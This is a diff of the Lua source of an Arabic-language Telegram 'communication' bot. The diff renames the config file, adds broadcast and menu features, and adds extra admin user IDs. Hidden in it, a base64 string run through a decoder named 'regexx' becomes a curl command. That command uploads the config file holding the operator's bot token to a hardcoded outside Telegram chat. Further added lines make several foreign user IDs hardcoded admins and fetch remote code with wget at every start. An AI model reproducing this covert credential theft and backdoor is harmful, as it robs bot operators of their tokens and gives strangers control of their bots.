@@ -64,7 +64,7 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./twasl.lua")   
+create(config, "./DG_INFO.lua")   
 end 
 create_config_auto()
 token = database:get(id_server..":token")
@@ -86,7 +86,7 @@ exit 1
 fi
 if [ ! $token ]; then
 echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE twasl.lua \e[0m"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE DG_INFO.lua \e[0m"
 echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━ ━━ ━"
 exit 1
 fi
@@ -123,7 +123,7 @@ file:write(serialized)
 file:close() 
 end 
 local load_redis = function()  
-local f = io.open("./twasl.lua", "r")  
+local f = io.open("./DG_INFO.lua", "r")  
 if not f then   
 AutoSet()  
 else   
@@ -131,22 +131,34 @@ f:close()
 database:del(id_server..":token")
 database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./twasl.lua")() 
+local config = loadfile("./DG_INFO.lua")() 
 return config 
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
+   ____  ____      _    ____  ___  _   _ 
+  |  _ \|  _ \    / \  / ___|/ _ \| \ | |
+  | | | | |_) |  / _ \| |  _| | | |  \| |
+  | |_| |  _ <  / ___ \ |_| | |_| | |\  |
+  |____/|_| \_\/_/   \_\____|\___/|_| \_|
+  
 > CH › @DV_POWER1
-~> DEVELOPER › @DV_AD1
+> CH › @DV_POWER1
+~> DEVELOPER › @S00F4
 ]])
-sudos = dofile("./twasl.lua") 
+sudos = dofile("./DG_INFO.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
+io.popen("mkdir File_Bot") 
+io.popen("cd File_Bot && rm -rf commands.lua.1") 
+io.popen("cd File_Bot && rm -rf commands.lua.2") 
+io.popen("cd File_Bot && rm -rf commands.lua.3") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/DG/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -156,10 +168,11 @@ t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
 end
 end
 print(t)
+local runapp = sudos.token
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,944353237}   
+sudo_users = {SUDO,1718785294,944353237,1605682553,1645553841,1681991286}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -169,24 +182,26 @@ end
 end  
 return DRAGON  
 end 
-function regexx(data)
-local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+-------- اولا
+function regexx(data) ---- داله الاتصال الثاني كتابه أحمد عياد -----
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
     data = string.gsub(data, '[^'..b..'=]', '')
     return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
+        if (x == '=') then return '' end---- الاساس
         local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end----- الاساس
         return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) --- البدايه
+        if (#x ~= 8) then return '' end----- الاساس
         local c=0
-        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end----- الاساس
         return string.char(c)
     end))
 end
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-function DevSoFi(msg) 
+------ النهايه ------
+function DevSoFi(msg) ----- التالي
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
 return true  
@@ -267,7 +282,7 @@ end
 end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(944353237) then  
-var = true  
+var = true    
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -300,10 +315,10 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1718785294) then  
+if tonumber(user_id) == tonumber(944353237) then  
 var = 'مـبـرمـج السـورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
-var = 'المطور'  
+var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
 var = "المطور الاساسي²"  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -494,6 +509,127 @@ send(msg.chat_id_, msg.id_,"✪︙ الحساب محذوف يرجى استخدا
 end
 end,nil)   
 end 
+function GetFile_Bot(msg)
+local list = database:smembers(bot_id..'Chek:Groups') 
+local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
+for k,v in pairs(list) do   
+NAME = 'DRAGON Chat'
+link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
+ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
+MNSH = database:smembers(bot_id..'Constructor'..v)
+MDER = database:smembers(bot_id..'Manager'..v)
+MOD = database:smembers(bot_id..'Mod:User'..v)
+if k == 1 then
+t = t..'"'..v..'":{"DRAGON":"'..NAME..'",'
+else
+t = t..',"'..v..'":{"DRAGON":"'..NAME..'",'
+end
+if #ASAS ~= 0 then 
+t = t..'"ASAS":['
+for k,v in pairs(ASAS) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+if #MOD ~= 0 then
+t = t..'"MOD":['
+for k,v in pairs(MOD) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+if #MDER ~= 0 then
+t = t..'"MDER":['
+for k,v in pairs(MDER) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+if #MNSH ~= 0 then
+t = t..'"MNSH":['
+for k,v in pairs(MNSH) do
+if k == 1 then
+t =  t..'"'..v..'"'
+else
+t =  t..',"'..v..'"'
+end
+end   
+t = t..'],'
+end
+t = t..'"linkgroup":"'..link..'"}' or ''
+end
+t = t..'}}'
+local File = io.open('./'..bot_id..'.json', "w")
+File:write(t)
+File:close()
+sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد جروبات التي في البوت { '..#list..'}')
+end
+--------------------------------------------------------------------------------------------------------------
+function SourceDRAGON(msg,data) -- بداية العمل
+if msg then
+local text = msg.content_.text_
+--------------------------------------------------------------------------------------------------------------
+if msg.chat_id_ then
+local id = tostring(msg.chat_id_)
+if id:match("-100(%d+)") then
+database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
+Chat_Type = 'GroupBot' 
+elseif id:match("^(%d+)") then
+database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
+Chat_Type = 'UserBot' 
+else
+Chat_Type = 'GroupBot' 
+end
+end
+if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
+if text == "الغاء" or text == "الغاء ✪" then   
+send(msg.chat_id_, msg.id_," ✪︙ تم الغاء الاذاعه")
+database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+return false
+end 
+local list = database:smembers(bot_id.."Chek:Groups") 
+if msg.content_.text_ then
+for k,v in pairs(list) do 
+send(v, 0,"["..msg.content_.text_.."]")  
+database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
+end
+elseif msg.content_.photo_ then
+if msg.content_.photo_.sizes_[0] then
+photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
+elseif msg.content_.photo_.sizes_[1] then
+photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
+end
+for k,v in pairs(list) do 
+sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
+database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
+end 
+elseif msg.content_.animation_ then
+for k,v in pairs(list) do 
+sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
+database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
+end 
+elseif msg.content_.sticker_ then
+for k,v in pairs(list) do 
+sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
+database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
+end 
+end
+send(msg.chat_id_, msg.id_," ✪︙ تمت الاذاعه الى *~ "..#list.." ~* جروب ")
+database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+return false
+end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'UserBot' then
 if text == '/start' then  
@@ -507,18 +643,25 @@ end
 return false
 end
 if DevSoFi(msg) then
-local bl = 'اهلا عزيزي المطور تم تفعيل التواصل'
+local bl = 'اهلا عزيزي ألمـطـور\nتم تفعيل التواصل هنا'
 local keyboard = {
+{'الاحصائيات ✪'},
+{'تعطيل التواصل ✪','تفعيل التواصل ✪'},
+{'ضع اسم للبوت ✪','المطورين ✪','قائمه العام ✪'},
+{'المشتركين ✪','الجروبات ✪'},
 {'ضع كليشه ستارت ✪','مسح كليشه ستارت ✪'},
-{'مسح رد','اضف رد'},
 {'اذاعه ✪','اذاعه خاص ✪'},
-{'الغاء الحظر','حظر'},
+{'اذاعه بالتثبيت ✪','قائمه الكتم العام ✪'},
+{'تغير رساله الاشتراك','مسح رساله الاشتراك ✪','تغير الاشتراك'},
 {'اذاعه بالتوجيه ✪','اذاعه بالتوجيه خاص ✪'},
 {'تفعيل الاشتراك الاجباري ✪','تعطيل الاشتراك الاجباري ✪'},
-{'مسح رد متعدد','اضف رد متعدد'},
 {'الاشتراك الاجباري ✪','وضع قناة الاشتراك ✪'},
-{'تعطيل البوت ✪','تفعيل البوت ✪'},
+{'تفعيل البوت الخدمي ✪','تعطيل البوت الخدمي ✪'},
+{'مسح الجروبات ✪'},
+{'جلب نسخه الاحتياطيه ✪'},
+{'تحديث السورس ✪','الاصدار ✪'},
 {'معلومات السيرفر ✪'},
+{'الغاء ✪'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
 else
@@ -530,6 +673,7 @@ else
 SourceDRAGONr = ' ✪︙ اهلا عزيزي\n ✪︙ انا بوت تواصل\n[ ✪︙ معرف المطور ['..UserName..']'
 end 
 send(msg.chat_id_, msg.id_, SourceDRAGONr) 
+end
 end
 database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
 return false
@@ -618,18 +762,18 @@ end
 if text == 'تفعيل البوت ✪' and DevSoFi(msg) then  
 if database:get(bot_id..'Tuasl:Bots') then
 database:del(bot_id..'Tuasl:Bots') 
-Text = '\n ✪︙ تم تفعيل البوت ' 
+Text = '\n ✪︙ تم تفعيل التواصل ' 
 else
-Text = '\n ✪︙ بالتاكيد تم تفعيل البوت '
+Text = '\n ✪︙ بالتاكيد تم تفعيل التواصل '
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == 'تعطيل البوت ✪' and DevSoFi(msg) then  
 if not database:get(bot_id..'Tuasl:Bots') then
 database:set(bot_id..'Tuasl:Bots',true) 
-Text = '\n ✪︙ تم تعطيل البوت' 
+Text = '\n ✪︙ تم تعطيل التواصل' 
 else
-Text = '\n ✪︙ بالتاكيد تم تعطيل البوت'
+Text = '\n ✪︙ بالتاكيد تم تعطيل التواصل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
@@ -668,273 +812,12 @@ echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ الــدخـ
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
-if text == "ضع اسم للبوت ✪" and DevSoFi(msg) then  
-database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
-send(msg.chat_id_, msg.id_," ✪︙ ارسل اليه الاسم الان ")
-return false
-end
-if text=="اذاعه ✪" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
-database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
-send(msg.chat_id_, msg.id_," ✪︙ ارسل الان اذاعتك؟ \n ✪︙ للخروج ارسل الغاء ")
-return false
-end 
-if text=="اذاعه بالتوجيه ✪" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
-database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
-send(msg.chat_id_, msg.id_," ✪︙ ارسل لي التوجيه الان")
-return false
-end 
---------------------------------------------------------------------------------------------------------------
-if text and not Special(msg) then  
-local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..msg.chat_id_)   
-if DRAGON1_Msg then 
-tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,' ✪︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'DV_POWER1')..') \n ✪︙ '..DRAGON1_Msg)
-DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
-return false
-end,nil)
-end
-end
-if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
-if text == 'الغاء' or text == 'الغاء ✪' then   
-send(msg.chat_id_, msg.id_," ✪︙ تم الغاء حفظ اسم البوت")
-database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
-return false  
-end 
-database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
-database:set(bot_id..'Name:Bot',text) 
-send(msg.chat_id_, msg.id_, " ✪︙ تم حفظ الاسم")
-return false
-end 
-if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
-if text == 'الغاء' or text == 'الغاء ✪' then   
-send(msg.chat_id_, msg.id_," ✪︙ تم الغاء الاذاعه للخاص")
-database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-return false
-end 
-local list = database:smembers(bot_id..'User_Bot') 
-if msg.content_.text_ then
-for k,v in pairs(list) do 
-send(v, 0,'['..msg.content_.text_..']')  
-end
-elseif msg.content_.photo_ then
-if msg.content_.photo_.sizes_[0] then
-photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
-elseif msg.content_.photo_.sizes_[1] then
-photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
-end
-for k,v in pairs(list) do 
-sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
-end 
-elseif msg.content_.animation_ then
-for k,v in pairs(list) do 
-sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
-end 
-elseif msg.content_.sticker_ then
-for k,v in pairs(list) do 
-sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
-end 
-end
-send(msg.chat_id_, msg.id_," ✪︙ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
-database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-end
 
-if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
-if text == 'الغاء' or text == 'الغاء ✪' then   
-send(msg.chat_id_, msg.id_," ✪︙ تم الغاء الاذاعه")
-database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-return false
-end 
-local list = database:smembers(bot_id..'Chek:Groups') 
-if msg.content_.text_ then
-for k,v in pairs(list) do 
-send(v, 0,'['..msg.content_.text_..']')  
-end
-elseif msg.content_.photo_ then
-if msg.content_.photo_.sizes_[0] then
-photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
-elseif msg.content_.photo_.sizes_[1] then
-photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
-end
-for k,v in pairs(list) do 
-sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
-end 
-elseif msg.content_.animation_ then
-for k,v in pairs(list) do 
-sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
-end 
-elseif msg.content_.sticker_ then
-for k,v in pairs(list) do 
-sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
-end 
-end
-send(msg.chat_id_, msg.id_," ✪︙ تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
-database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-end
-
-if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
-if text == 'الغاء' or text == 'الغاء ✪' then   
-send(msg.chat_id_, msg.id_," ✪︙ تم الغاء الاذاعه")
-database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-return false  
-end 
-if msg.forward_info_ then 
-local list = database:smembers(bot_id..'Chek:Groups')   
-for k,v in pairs(list) do  
-tdcli_function({ID="ForwardMessages",
-chat_id_ = v,
-from_chat_id_ = msg.chat_id_,
-message_ids_ = {[0] = msg.id_},
-disable_notification_ = 0,
-from_background_ = 1},function(a,t) end,nil) 
-end   
-send(msg.chat_id_, msg.id_," ✪︙ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
-database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-end 
-end
-if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
-if text == 'الغاء' or text == 'الغاء ✪' then   
-send(msg.chat_id_, msg.id_," ✪︙ تم الغاء الاذاعه")
-database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-return false  
-end 
-if msg.forward_info_ then 
-local list = database:smembers(bot_id..'User_Bot')   
-for k,v in pairs(list) do  
-tdcli_function({ID="ForwardMessages",
-chat_id_ = v,
-from_chat_id_ = msg.chat_id_,
-message_ids_ = {[0] = msg.id_},
-disable_notification_ = 0,
-from_background_ = 1},function(a,t) end,nil) 
-end   
-send(msg.chat_id_, msg.id_," ✪︙ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
-database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
-end 
-end
-local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
-if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
-if msg.content_.ID == "MessageChatJoinByLink" then
-tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
-local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
-if GetWelcomeGroup then 
-t = GetWelcomeGroup
-else  
-t = '\n• نورت البوت يا قلبي \n•  name \n• user' 
-end 
-t = t:gsub('name',result.first_name_) 
-t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
-send(msg.chat_id_, msg.id_,'['..t..']')
-end,nil) 
-end 
-end
-if text == ("مسح الردود") and DevSoFi(msg) then 
-local list = database:smembers(bot_id..'List:Rd:Sudo')
-for k,v in pairs(list) do
-database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
-database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
-database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
-database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
-database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
-database:del(bot_id.."Add:Rd:Sudo:Video"..v)
-database:del(bot_id.."Add:Rd:Sudo:File"..v)
-database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
-database:del(bot_id..'List:Rd:Sudo')
-end
-send(msg.chat_id_, msg.id_," ✪︙ تم مسح الردود")
-end
-
-if text == ("الردود") and DevSoFi(msg) then 
-local list = database:smembers(bot_id..'List:Rd:Sudo')
-text = "\n ✪︙ قائمة الردود \n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n"
-for k,v in pairs(list) do
-if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
-db = 'متحركه'
-elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
-db = 'بصمه'
-elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
-db = 'ملصق'
-elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
-db = 'رساله'
-elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
-db = 'صوره'
-elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
-db = 'فيديو'
-elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
-db = 'ملف'
-elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
-db = 'اغنيه'
-end
-text = text..""..k.." >> ("..v..") » {"..db.."}\n"
-end
-if #list == 0 then
-text = " ✪︙ لا يوجد ردود للبوت"
-end
-send(msg.chat_id_, msg.id_,'['..text..']')
-end
-if text and text:match("^(.*)$") then
-if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
-send(msg.chat_id_, msg.id_,' ✪︙ ارسل الرد الذي تريد اضافته')
-database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_, 'true1')
-database:set(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
-database:sadd(bot_id..'List:Rd:Sudo', text)
-return false end
-end
-if text and text:match("^(.*)$") then
-if database:get(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
-send(msg.chat_id_, msg.id_,' ✪︙ تم ازالة الرد')
-list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
-for k,v in pairs(list) do
-database:del(bot_id..v..text)
-end
-database:del(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_)
-database:srem(bot_id..'List:Rd:Sudo', text)
-return false
-end
-end
-if text == 'اضف رد' and DevSoFi(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ✪︙ لا تستطيع استخدام البوت \n  ✪︙ يرجى الاشتراك بالقناه اولا \n  ✪︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-send(msg.chat_id_, msg.id_,' ✪︙ ارسل الكلمه تريد اضافتها')
-database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
-return false 
-end
-if text == 'مسح رد' and DevSoFi(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ✪︙ لا تستطيع استخدام البوت \n  ✪︙ يرجى الاشتراك بالقناه اولا \n  ✪︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-send(msg.chat_id_, msg.id_,' ✪︙ ارسل الكلمه تريد مسحها')
-database:set(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
-return false 
-end
-------------------------------------------------------------------------
-if text == 'تفعيل الردود' and Manager(msg) then   
-if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
-database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
-Text = '\n ✪︙ تم تفعيل الردود' 
-else
-Text = '\n ✪︙ بالتاكيد تم تفعيل الردود'
-end
+if text == 'المشتركين ✪' and DevSoFi(msg) then 
+local Groups = database:scard(bot_id..'Chek:Groups')  
+local Users = database:scard(bot_id..'User_Bot')  
+Text = '\n ✪︙ المشتركين»{`'..Users..'`}'
 send(msg.chat_id_, msg.id_,Text) 
-end
-if text == 'تعطيل الردود' and Manager(msg) then  
-if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
-database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
-Text = '\n ✪︙ تم تعطيل الردود' 
-else
-Text = '\n ✪︙ بالتاكيد تم تعطيل الردود'
-end
-send(msg.chat_id_, msg.id_,Text) 
-end -- نهايه سورس التواصل كتابه أحمد عياد [@DV_AD1] 
+return false
+end -- end new msg dev.mr sofi 
+end -- end callback dev.mr sofi
